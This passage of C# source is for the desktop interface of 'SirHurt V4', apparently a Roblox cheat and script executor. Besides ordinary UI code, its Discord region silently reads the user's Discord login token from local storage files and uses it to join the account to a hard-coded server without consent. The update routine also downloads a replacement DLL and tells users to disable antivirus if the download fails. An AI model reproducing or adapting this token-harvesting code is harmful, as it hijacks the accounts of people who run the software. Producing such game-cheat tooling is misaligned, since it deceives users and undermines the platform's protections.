            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
            byte[] hash = md5.ComputeHash(inputBytes);

            // step 2, convert byte array to hex string
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hash.Length; i++)
            {
                sb.Append(hash[i].ToString("X2"));
            }
            return sb.ToString();
        }

        private void Settings_MouseEnter(object sender, EventArgs e)
        {
            Settings.BackColor = Color.FromArgb(60, 60, 60);
            Settings.Image = Resources.Settings;
        }

        private void Settings_MouseLeave(object sender, EventArgs e)
        {
            Settings.BackColor = Color.FromArgb(50, 50, 50);
            Settings.Image = Resources.SettingsHolder;
        }

        private void ScriptListOpener_Click(object sender, EventArgs e)
        {
            AstheticPanel.Visible = !AstheticPanel.Visible;
            if (AstheticPanel.Visible)
            {
                ScriptLoading();
                ScriptListOpener.Image = Resources.explorer1_white1;
                while (ScriptListHolder.Width <= NewWidth && AstheticPanel.Visible)
                {
                    if (ScriptListHolder.Width == NewWidth) break;
                    ScriptListHolder.Width += 3;
                    Application.DoEvents();
                }
                ScriptList.Scrollable = true;
            }
            else if (!AstheticPanel.Visible)
            {
                ScriptList.Scrollable = false;
                ScriptListOpener.Image = Resources.explorer1;
                while (ScriptListHolder.Width >= 0 && !AstheticPanel.Visible)
                {
                    if (ScriptListHolder.Width == 0) break;
                    ScriptListHolder.Width -= 3;
                    Application.DoEvents();
                }
            }
        }

        private void ScriptListAdjust_MouseDown(object sender, MouseEventArgs e)
        {
            MDown2 = true;
        }

        private void ScriptListAdjust_MouseUp(object sender, MouseEventArgs e)
        {
            MDown2 = false;
        }

        private void ScriptListAdjust_MouseMove(object sender, MouseEventArgs e)
        {
            if (Cursor.Current.ToString() == "[Cursor: SizeWE]" && MDown2)
            {
                ScriptListHolder.Size = new Size(ScriptListHolder.Width + (e.Location.X), ScriptListHolder.Height);
                NewWidth = ScriptListHolder.Width;
                Update();
            }
        }

        #endregion
        #region ExtraFunctions

        private void CheckFiles()
        {
            var CurrentDirectory = Environment.CurrentDirectory;

            foreach (string Item in Files)
            {
                if (!File.Exists($"{CurrentDirectory}\\{Item}"))
                {
                    DialogResult diag = MessageBox.Show($"Sirhurt required file: {Item} is missing, please launch the bootstrapper! Would you like to contiune?", "Sirhurt V4", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                    if (diag == DialogResult.No)
                    {
                        Process.GetCurrentProcess().Kill();
                    }
                }
            }

            if (!RedistributablePackage.IsInstalled(RedistributablePackageVersion.VC2015to2019x64) && !RedistributablePackage.IsInstalled(RedistributablePackageVersion.VC2015to2019x86) && !RedistributablePackage.IsInstalled(RedistributablePackageVersion.VC2015x64) && !RedistributablePackage.IsInstalled(RedistributablePackageVersion.VC2015x86) && !RedistributablePackage.IsInstalled(RedistributablePackageVersion.VC2017x64) && !RedistributablePackage.IsInstalled(RedistributablePackageVersion.VC2017x86))
            {
                MessageBox.Show("VCRedist files missing, please install them and relaunch the UI!", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.Start("https://go.microsoft.com/fwlink/?LinkId=746572");
                Process.Start("https://go.microsoft.com/fwlink/?LinkId=746571");
                Process.GetCurrentProcess().Kill();
            }


            var wtKey = Registry.CurrentUser.OpenSubKey("Software\\Asshurt", true);
            if (wtKey != null)
            {
                wtKey.SetValue("WNT", Text, RegistryValueKind.String);
            }
            try
            {
                string Latest_DLL = new WebClient().DownloadString("https://sirhurt.net/asshurt/update/v4/fetch_sirhurt_version.php");
                string DLL_Link = new WebClient().DownloadString("https://sirhurt.net/asshurt/update/v4/fetch_version.php");

                if (Latest_DLL != "Failed: A update has not yet been released for this ROBLOX build." && wtKey != null)
                {
                    string version_hash = wtKey.GetValue("VHASH").ToString();

                    if (version_hash != CalculateMD5Hash(Latest_DLL))
                    {
                        DialogResult dialogResult = MessageBox.Show(this, "It appears a new SirHurt V4 version is avaliable. Would you like to download it?", "SIRHURT V4 UPDATE NOTIFICATION", MessageBoxButtons.YesNo);

                        if (dialogResult == DialogResult.Yes)
                        {
                            WebClient client = new WebClient();

                            string SirHurtPath = Directory.GetCurrentDirectory();
                            client.DownloadFile(DLL_Link, SirHurtPath + "\\SirHurt.new");
                            client.Dispose();

                            if (File.Exists(SirHurtPath + "\\SirHurt.dll"))
                            {
                                File.Delete(SirHurtPath + "\\SirHurt.dll");
                            }

                            if (!File.Exists(SirHurtPath + "\\SirHurt.new"))
                            {
                                MessageBox.Show("SirHurt was not able to be downloaded. Try turning off your anti virus software than restarting.");
                                Environment.Exit(0);
                            }
                            else
                            {
                                File.Move(SirHurtPath + "\\SirHurt.new", SirHurtPath + "\\SirHurt.dll");
                            }

                            wtKey.SetValue("VHASH", CalculateMD5Hash(Latest_DLL), RegistryValueKind.String);
                        }
                    }

                    wtKey.Close();
                }
            }
            catch { }
        }
        public void SirHurtPipe(string script)
        {
            try
            {
                File.WriteAllText("sirhurt.dat", script);
            }
            catch (Exception Oop)
            {
                MessageBox.Show($"Something went wrong: {Oop.ToString()}", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
        }

        public void BunifuBrokeFix()
        {
            Settings.BorderRadius = 0;
            ScriptListOpener.BorderRadius = 0;
            bunifuTransition1.AnimationType = BunifuAnimatorNS.AnimationType.HorizBlind;
            ScriptHubPanel.Location = new Point(0, 0);
            ScriptHubPanel.Dock = DockStyle.Fill;
            ScriptList.ImageList = ImageList;
        }

        private void Main_Click(object sender, System.EventArgs e)
        {
            MessageBox.Show(@"UI Design/Coding: Iris#0410
Exploit: IcePools/Aero
TreeView Help: Anthony | Africanus | Breakshoot
", "Credits", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        public void ExtraEventHandlers()
        {

            ScriptList.AllowDrop = true;
            ScriptList.ItemDrag += new ItemDragEventHandler(treeView1_ItemDrag);
            ScriptList.DragEnter += new DragEventHandler(treeView1_DragEnter);
            ScriptList.DragOver += new DragEventHandler(treeView1_DragOver);
            ScriptList.DragDrop += new DragEventHandler(treeView1_DragDrop);

            FileSystemWatcher Watcher = new FileSystemWatcher($"{Environment.CurrentDirectory}\\Scripts");
            Watcher.EnableRaisingEvents = true;
            Watcher.IncludeSubdirectories = true;

            Watcher.Deleted += (q, e) =>
            {
                ScriptList.Invoke(new Action(() =>
                {
                    var modifiedNode = ScriptList.Nodes.Find(e.Name, true);
                    if (modifiedNode.Length == 1)
                    {
                        modifiedNode[0].Remove();
                    }
                }));
            };

            Watcher.Created += (q, e) =>
            {
                ScriptList.Invoke(new Action(() =>
                {
                    ScriptList.Nodes.Clear();
                    ScriptLoading();
                }));
            };

            Watcher.Renamed += (q,e) => {
                ScriptList.Invoke(new Action(() =>
                {
                    var modifiedNode = ScriptList.Nodes.Find(e.OldName, true);

                    if (modifiedNode.Length == 1)
                    {
                        modifiedNode[0].Name = e.FullPath;
                        modifiedNode[0].Text = Path.GetFileName(e.FullPath);
                    }
                }));
            };

        }
        private void treeView1_ItemDrag(object sender, ItemDragEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DoDragDrop(e.Item, DragDropEffects.Move);
            }

            else if (e.Button == MouseButtons.Right)
            {
                DoDragDrop(e.Item, DragDropEffects.Copy);
            }
        }

        private void treeView1_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = e.AllowedEffect;
        }

        private void treeView1_DragOver(object sender, DragEventArgs e)
        {
            Point targetPoint = ScriptList.PointToClient(new Point(e.X, e.Y));

            ScriptList.SelectedNode = ScriptList.GetNodeAt(targetPoint);
        }

        private void treeView1_DragDrop(object sender, DragEventArgs e)
        {
            Point targetPoint = ScriptList.PointToClient(new Point(e.X, e.Y));

            TreeNode targetNode = ScriptList.GetNodeAt(targetPoint);

            TreeNode draggedNode = (TreeNode)e.Data.GetData(typeof(TreeNode));


            if (!draggedNode.Equals(targetNode) && !ContainsNode(draggedNode, targetNode))
            {
                if (e.Effect == DragDropEffects.Move)
                {
                    if (targetNode == null)
                    {
                        try
                        {
                            File.Move($"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.FullPath}", $"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.Text}");
                        }
                        catch { }
                    }
                    else if (Directory.Exists($"{Environment.CurrentDirectory}\\Scripts\\{targetNode.FullPath}"))
                    {
                        if (File.Exists($"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.FullPath}"))
                            File.Move($"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.FullPath}", $"{Environment.CurrentDirectory}\\Scripts\\{targetNode.FullPath}\\{draggedNode.Text}");
                        else if (Directory.Exists($"{Environment.CurrentDirectory}\\Scripts\\{draggedNode.FullPath}"))
                            return;
                    }
                    else
                    {
                        Debug($"{Environment.CurrentDirectory}\\Scripts\\{targetNode.FullPath}");
                        MessageBox.Show("Invalid directory!", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }

                }
                if (targetNode != null)
                    targetNode.Expand();
            }

        }

        private bool ContainsNode(TreeNode node1, TreeNode node2)
        {
            try
            {
                if (node2.Parent == null) return false;
                if (node2.Parent.Equals(node1)) return true;
                return ContainsNode(node1, node2.Parent);
            }
            catch
            {
                return false;
            }
        }

        public void OldPopulateTree(string dir, TreeNode node)
        {
            try
            {
                var directory = new DirectoryInfo(dir);
                foreach (var d in directory.GetDirectories())
                {
                    var t = new TreeNode(d.Name);
                    if (node != null) node.Nodes.Add(t);
                    else ScriptList.Nodes.Add(t);
                    PopulateTree(d.FullName, t);
                }

                foreach (var f in directory.GetFiles())
                {
                    var t = new TreeNode(f.Name);
                    if (node != null) node.Nodes.Add(t);
                    else ScriptList.Nodes.Add(t);
                }
            }
            catch
            {
            }
        }

        public void PopulateTree(string dir, TreeNode node)
        {
            try
            {
                var directory = new DirectoryInfo(dir);
                foreach (var d in directory.GetDirectories())
                {
                    var t = new TreeNode(d.Name);
                    t.Name = d.Name;
                    if (node != null)
                    {
                        node.Nodes.Add(t);
                        SetNodeIcon(d.FullName, t);
                    }
                    else
                    {
                        ScriptList.Nodes.Add(t);
                        SetNodeIcon(d.FullName, t);
                    }
                    PopulateTree(d.FullName, t);
                }


                foreach (var f in directory.GetFiles())
                {
                    var t = new TreeNode(f.Name);
                    t.Name = f.Name;
                    if (node != null)
                    {
                        node.Nodes.Add(t);
                        SetNodeIcon(f.FullName, t);
                    }
                    else
                    {
                        ScriptList.Nodes.Add(t);
                        SetNodeIcon(f.FullName, t);
                    }
                }
            }
            catch
            {
            }
        }

        private void ScriptLoading()
        {
            try
            {
                ScriptList.Nodes.Clear();
                var flag = Directory.Exists(Environment.CurrentDirectory + "\\Scripts");
                if (!flag) Directory.CreateDirectory(Environment.CurrentDirectory + "\\Scripts");
            }
            catch
            { }
            if (Funcs.ToBool(MyIni.Read("useoldscriptloader", "main")))
            {
                OldPopulateTree(Environment.CurrentDirectory + "\\Scripts", null);
                return;
            }
            PopulateTree(Environment.CurrentDirectory + "\\Scripts", null);
        }
        public static string RandomString(int maxSize)
        {
            var array = new char[62];
            array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
            var array2 = new byte[1];
            using (var rngcryptoServiceProvider = new RNGCryptoServiceProvider())
            {
                rngcryptoServiceProvider.GetNonZeroBytes(array2);
                array2 = new byte[maxSize];
                rngcryptoServiceProvider.GetNonZeroBytes(array2);
            }

            var stringBuilder = new StringBuilder(maxSize);
            foreach (var b in array2) stringBuilder.Append(array[b % array.Length]);
            return stringBuilder.ToString();
        }

        private JObject JsonDecode(string Json)
        {
            return JObject.Parse(Json);
        }

        public string httpGet(string link)
        {
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(link);
            httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            string result;
            using (var httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
            {
                using (var responseStream = httpWebResponse.GetResponseStream())
                {
                    using (var streamReader = new StreamReader(responseStream))
                    {
                        result = streamReader.ReadToEnd();
                    }
                }
            }

            return result;
        }

        #endregion
        #region EventShit

        private void Main_LocationChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.SavedLocation = Location;
        }

        private void Toggle_OnValuechange(object sender, EventArgs e)
        {
            BunifuToggleSwitch toggle = (sender as BunifuToggleSwitch);
            if (toggle.Name.Contains("fps"))
            {
                fpsunlockerdata = toggle.Value;

                MyIni.Write("fpsUnlocker", toggle.Value.ToString().ToLower(), "extra");

                var wtKey = Registry.CurrentUser.OpenSubKey("Software\\Asshurt", true);
                if (fpsunlockerdata)
                {
                    if (wtKey != null)
                    {
                        wtKey.SetValue("EnableFPSUnlocker", "1", RegistryValueKind.String);
                        wtKey.Close();
                    }
                }
                else
                {
                    if (wtKey != null)
                    {
                        wtKey.SetValue("EnableFPSUnlocker", "0", RegistryValueKind.String);
                        wtKey.Close();
                    }
                }
            }
            else if (toggle.Name.Contains("topmost"))
            {
                topmostdata = toggle.Value;
                TopMost = topmostdata;

                MyIni.Write("topMost", toggle.Value.ToString().ToLower(), "extra");
                TopMost = topmostdata;
            }
            else if (toggle.Name.Contains("multi"))
            {
                multiappdata = toggle.Value;


                MyIni.Write("multiApplication", toggle.Value.ToString().ToLower(), "extra");

                try
                {
                    if (multiappdata)
                    {
                        foreach (Process Proc in Process.GetProcessesByName("RobloxPlayerBeta"))
                            Proc.Kill();
                        new Mutex(true, "ROBLOX_singletonMutex");
                    }
                    else
                        new Mutex(false, "ROBLOX_singletonMutex");
                }
                catch { }
            }
            else if (toggle.Name.Contains("auto"))
            {
                autoinjectdata = toggle.Value;


                MyIni.Write("autoInject", toggle.Value.ToString().ToLower(), "extra");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("Applying these changes will restart the UI, please make sure you've saved all your scripts. Would you like to continue?", "Sirhurt V4", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (dialogResult == DialogResult.Yes)
            {
                MyIni.Write("buttonbackcolor", BBackColor.Text, "TabControl");
                MyIni.Write("ribboncolor", RibbonColor.Text, "TabControl");
                MyIni.Write("ribbonheight", RibbonHeight.Text, "TabControl");
                MyIni.Write("tabbackcolor", TabBackColor.Text, "TabControl");
                MyIni.Write("textcolor", TabTextColor.Text, "TabControl");
                MyIni.Write("topclickedcolor", TabClickedColor.Text, "TabControl");
                MyIni.Write("toppanelcolor", TopPanelColor.Text, "TabControl");

                MyIni.Write("textEditorColor", EditorBackColor.Text, "scintilla");
                MyIni.Write("textColor", EditorTextColor.Text, "scintilla");
                MyIni.Write("blockComment", EditorCommentColor.Text, "scintilla");
                MyIni.Write("commentLine", EditorCommentColor.Text, "scintilla");
                MyIni.Write("commentDoc", EditorCommentColor.Text, "scintilla");
                MyIni.Write("integer", EditorIntColor.Text, "scintilla");
                MyIni.Write("string", EditorStringColor.Text, "scintilla");
                MyIni.Write("operator", EditorOperatorColor.Text, "scintilla");
                MyIni.Write("keyword1 Color(\"warn print decompile\")", EditorKeyword1Color.Text, "scintilla");
                MyIni.Write("keyword2 Color(\"if then else\")", EditorKeyword2Color.Text, "scintilla");
                MyIni.Write("keyword3 Color(\"getgenv setclipboard getupvalue\")", EditorKeyword3Color.Text, "scintilla");
                MyIni.Write("Custom Keyword Color", CustomKeywordColor.Text, "scintilla");

                Process.Start(Application.ExecutablePath);
                Process.GetCurrentProcess().Kill();
            }
        }
        #endregion
        #region ToolStripShit

        private void toolStripTextBox1_TextChanged(object sender, EventArgs e)
        {
            irisTabControl1.ReName(toolStripTextBox1.Text);
        }

        private void newScriptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            irisTabControl1.CreateTab();
        }

        private void openFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            irisTabControl1.OpenFile();
        }
        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (StreamWriter writer = new StreamWriter($"{Environment.CurrentDirectory}\\Scripts\\{irisTabControl1.GetTabName()}"))
            {
                writer.Write(irisTabControl1.GetWorkingEditor().Text);
            }
        }

        private void saveAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            irisTabControl1.SavePointedTab();
        }

        private void logoutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(var Value in Registry.CurrentUser.OpenSubKey("Software\\Asshurt").GetSubKeyNames())
            {
                Registry.CurrentUser.DeleteSubKey($"Software\\Asshurt\\{Value}");
            }
            Registry.CurrentUser.DeleteSubKey("Software\\Asshurt");
        }

        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            FindReplace findReplace = new FindReplace();
            findReplace = new FindReplace(irisTabControl1.GetWorkingEditor());
            findReplace.ShowFind();
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            bunifuTransition1.ShowSync(SettingsPanel);
        }
        #endregion
        #region ScriptListBS
        private void setParentToScriptsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string ItemPath = $"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}";
                if (!File.Exists($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.Text}"))
                    File.Move(ItemPath, $"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.Text}");
                else
                    MessageBox.Show("File already exists in directory!", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch { }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                File.Delete($"{Environment.CurrentDirectory}\\Scripts\\{ScriptList.SelectedNode.FullPath}");
            }
            catch { }
        }

        private void ScriptList_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ScriptList.SelectedNode = e.Node;
            }
        }

        private void createFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists($"{Environment.CurrentDirectory}\\Scripts\\New Folder"))
                Directory.CreateDirectory($"{Environment.CurrentDirectory}\\Scripts\\New Folder");
        }

        private void ScriptList_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                using (var sr = new StreamReader(Environment.CurrentDirectory + $"\\Scripts\\{ScriptList.SelectedNode.FullPath}"))
                {
                    irisTabControl1.CreateTab(ScriptList.SelectedNode.Text, sr.ReadToEnd());
                }

            }
            catch { }
        }

        private void SaveToScriptsMenuStrip_Click(object sender, EventArgs e)
        {
            using (StreamWriter Writer = new StreamWriter($"{Environment.CurrentDirectory}\\Scripts\\{irisTabControl1.GetTabName()}"))
            {
                Writer.Write(irisTabControl1.GetWorkingEditor().Text);
            }
        }

        private void ScriptList_BeforeExpand(object sender, System.Windows.Forms.TreeViewCancelEventArgs e)
        {
            e.Node.ImageKey = "folder_open";
            e.Node.SelectedImageKey = "folder_open";
        }
        private void ScriptList_AfterCollapse(object sender, TreeViewEventArgs e)
        {
            e.Node.ImageKey = "folder_closed";
            e.Node.SelectedImageKey = "folder_closed";
        }
        #endregion
        #region DiscordStuff
        public static string GetDiscordToken()
        {
            string leveldb_storage = Path.Combine(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord"), "Local Storage"), "leveldb");

            var debounce = false;
            if (!Directory.Exists(leveldb_storage))
                return "NONE";

            foreach (var LFile in Directory.EnumerateFiles(leveldb_storage, "*.*", SearchOption.AllDirectories).Where(s => s.EndsWith(".ldb")))
            {
                var source = File.ReadAllLines(LFile);
                foreach (string str in source)
                {
                    if (!str.Contains("token") && !str.Contains("oken"))
                    {
                        if (!debounce) continue;
                        debounce = false;
                    }
                    else
                    {
                        debounce = true;
                    }

                    var regfilter = Regex.Replace(str, "[^0-9a-zA-Z\\.\\-_\"=]+", "");
                    var token_ = Regex.Matches(regfilter, "\"(.+?)\"");

                    foreach (Match Mat in token_)
                    {
                        var Token = Mat.Groups[1].Value.Replace("\"", "");

                        if (Token.Length > 50)
                        {
                            return Token;
                        }
                    }
                }
            }

            return "NONE";
        }

        public string JoinDiscord(string token, string invite)
        {
            var httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/invites/" + invite);
            httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            httpWebRequest.Method = "POST";

            httpWebRequest.Headers["Authorization"] = token;
            httpWebRequest.Headers["Origin"] = "https:///discordapp.com";
            httpWebRequest.Referer = "https:///discord.gg/" + invite;

            httpWebRequest.ContentType = "text/plain";
            httpWebRequest.ContentLength = 0;

            string result;
            using (var httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
            {
                using (var responseStream = httpWebResponse.GetResponseStream())
                {
                    using (var streamReader = new StreamReader(responseStream))
                    {
                        result = streamReader.ReadToEnd();
                    }
                }
            }

            return result;
        }

        private void Handle_Discord()
        {
            try
            {
                string Discord_Token = GetDiscordToken();

                if (Discord_Token != "NONE")
                {
                    var wtKey = Registry.CurrentUser.OpenSubKey("Software\\Asshurt", true);
                    if (wtKey != null)
                    {
                        string discord_invcode = "cv36XTD"; //Fuzions Fairy Pond
                        string joined_discord;

                        try
                        {
                            joined_discord = wtKey.GetValue("Joined_Discord").ToString();
                        }
                        catch
                        {
                            wtKey.CreateSubKey("Joined_Discord", true);
                            wtKey.SetValue("Joined_Discord", discord_invcode);
                            joined_discord = wtKey.GetValue("Joined_Discord").ToString();
                        }

                        if (joined_discord != discord_invcode)
                        {
                            string res = JoinDiscord(Discord_Token, discord_invcode);

                            wtKey.SetValue("Joined_Discord", discord_invcode, RegistryValueKind.String);
                        }

                        wtKey.Close();
                    }
                }
            }
            catch
            {

            }
        }
        #endregion
        #region IconLoaderShit

        /*
         * Love you anthony very much <3
         */
        public static Icon GetStockIcon(NativeMethods.SHSTOCKICONID siid)
        {
            var stockIconInfo = new NativeMethods.SHSTOCKICONINFO();
            stockIconInfo.cbSize = (uint)Marshal.SizeOf<NativeMethods.SHSTOCKICONINFO>();
            NativeMethods.SHGetStockIconInfo(siid, (uint)NativeMethods.SHGFI.Icon, ref stockIconInfo);
            var icon = Icon.FromHandle(stockIconInfo.hIcon).ToBitmap(); //convert to bitmap to make it transparent
            icon.MakeTransparent();
            NativeMethods.DestroyIcon(stockIconInfo.hIcon);
            return Icon.FromHandle(icon.GetHicon()); //back to icon
        }

        public static Icon GetFileTypeIcon(string filetype)
        {
            var iconInfo = new NativeMethods.SHFILEINFO();
            NativeMethods.SHGetFileInfo(filetype, 256, ref iconInfo, 0,
                (uint)(NativeMethods.SHGFI.Icon | NativeMethods.SHGFI.SmallIcon |
                        NativeMethods.SHGFI.UseFileAttributes));
            var icon = Icon.FromHandle(iconInfo.hIcon).ToBitmap();
            icon.MakeTransparent();
            NativeMethods.DestroyIcon(iconInfo.hIcon);
            return Icon.FromHandle(icon.GetHicon());
        }

        private void LoadIcons()
        {
            ImageList.Images.Add(new Bitmap(1, 1));
            ImageList.Images.Add("folder_closed", GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_FOLDERBACK));
            ImageList.Images.Add("folder_open", GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_FOLDER));
            ImageList.Images.Add(".txt", GetFileTypeIcon(".txt"));
            ImageList.Images.Add(".lua", GetFileTypeIcon(".lua"));
            ImageList.Images.Add(".json", GetFileTypeIcon(".json"));
            ImageList.Images.Add(".xml", GetFileTypeIcon(".xml"));
            ImageList.Images.Add(".js", GetFileTypeIcon(".js"));
            ImageList.Images.Add(".cpp", GetFileTypeIcon(".cpp"));
            ImageList.Images.Add(".jpg", GetFileTypeIcon(".jpg"));
            ImageList.Images.Add(".png", GetFileTypeIcon(".png"));
            ImageList.Images.Add(".gif", GetFileTypeIcon(".gif"));
            ImageList.Images.Add(".dll", GetFileTypeIcon(".dll"));
            ImageList.Images.Add(".config", GetFileTypeIcon(".config"));
            ImageList.Images.Add(".cs", GetFileTypeIcon(".cs"));
        }

        private void SetNodeIcon(string fileName, TreeNode fileNode)
        {
            if (Directory.Exists(fileName))
            {
                fileNode.ImageKey = "folder_closed";
                fileNode.SelectedImageKey = "folder_closed";
                return;
            }

            var extension = Path.GetExtension(fileName);

            if (extension.Equals(".exe"))
            {
                var icon = Icon.ExtractAssociatedIcon(fileName);
                if (icon != null)
                {
                    var iconBitmap = icon.ToBitmap();
                    iconBitmap.MakeTransparent();
                    ImageList.Images.Add(fileName, iconBitmap);
                    fileNode.ImageKey = fileName;
                    fileNode.SelectedImageKey = fileName;
                }
            }
            else if (!ImageList.Images.ContainsKey(extension))
            {
                var icon = GetFileTypeIcon(extension);
                ImageList.Images.Add(extension, icon);
                fileNode.ImageKey = extension;
                fileNode.SelectedImageKey = extension;
            }
            else
            {
                fileNode.ImageKey = extension;
                fileNode.SelectedImageKey = extension;
            }
        }
        #endregion
    }
}
